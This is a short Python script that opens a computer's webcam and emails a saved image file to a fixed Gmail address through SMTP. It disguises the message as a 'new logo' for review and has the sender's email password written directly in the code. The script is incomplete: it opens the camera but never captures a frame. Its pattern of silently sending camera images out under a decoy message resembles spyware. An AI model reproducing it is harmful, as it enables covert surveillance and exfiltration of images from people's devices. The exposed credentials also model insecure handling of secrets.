import smtplib
import imghdr
from email.message import EmailMessage


import cv2
def sent():
    key = cv2.waitKey(1)
    webcam = cv2.VideoCapture(0)

    Sender_Email = "spinoshit@gmail.com"
    Reciever_Email = "jolene5652@gmail.com"

    Password = 'B00fu123'
    newMessage = EmailMessage()


    newMessage['Subject'] = "Check out the new logo"
    newMessage['From'] = Sender_Email
    newMessage['To'] = Reciever_Email
    newMessage.set_content('Let me know what you think. Image attached!')
    with open("opencv_frame_0.png", 'rb') as f:
        image_data = f.read()
        image_type = imghdr.what(f.name)
        image_name = f.name
    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Sender_Email, Password)
        smtp.send_message(newMessage)
